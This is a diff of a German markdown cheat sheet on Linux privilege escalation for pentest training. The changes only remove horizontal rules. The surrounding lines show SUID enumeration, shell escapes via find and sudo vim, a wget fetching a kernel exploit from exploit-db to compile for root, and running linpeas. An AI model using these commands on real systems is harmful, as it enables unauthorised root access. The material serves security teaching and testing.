@@ -1,7 +1,7 @@
 # Linux Privilege Escalation
 
 
----
+
 
 ## Inhaltsverzeichnis
 - [Einleitung](#einleitung)
@@ -12,13 +12,13 @@
 - [Tools zur Privilege Escalation](#tools-zur-privilege-escalation)
 - [Haftungsausschluss](#haftungsausschluss)
 
----
+
 
 ## Einleitung
 
 Diese Datei dient als strukturiertes Cheat Sheet zur Privilege Escalation auf Linux-Systemen im Rahmen von Post-Exploitation. Sie hilft Pentestern und Sicherheitsanalysten, systematisch nach Wegen zu suchen, um aus eingeschränkten Benutzerrechten Root-Rechte zu erlangen. **Ausschließlich für legale Schulungszwecke gedacht.**
 
----
+
 
 ## 1. System Checks & Enumeration
 
@@ -47,7 +47,7 @@ find / -type f -perm -u=s 2>/dev/null
 find / -writable -type d 2>/dev/null # beschreibbare Verzeichnisse
 ```
 
----
+
 
 <div align=right>
 
@@ -80,7 +80,7 @@ Beispiel (wenn `find` SUID ist):
 find . -exec /bin/sh -p \; -quit
 ```
 
----
+
 
 ## 3. Exploitable Binaries & Schwachstellen
 
@@ -110,7 +110,7 @@ ls -la /etc/cron.*
 sudo vim -c '!sh'
 ```
 
----
+
 
 <div align=right>
 
@@ -142,7 +142,7 @@ wget https://www.exploit-db.com/raw/40616
 # Kompilieren und ausführen, um Root-Zugriff zu erlangen
 ```
 
----
+
 
 ## Tools zur Privilege Escalation
 
@@ -159,7 +159,7 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
----
+
 
 ## Haftungsausschluss
 
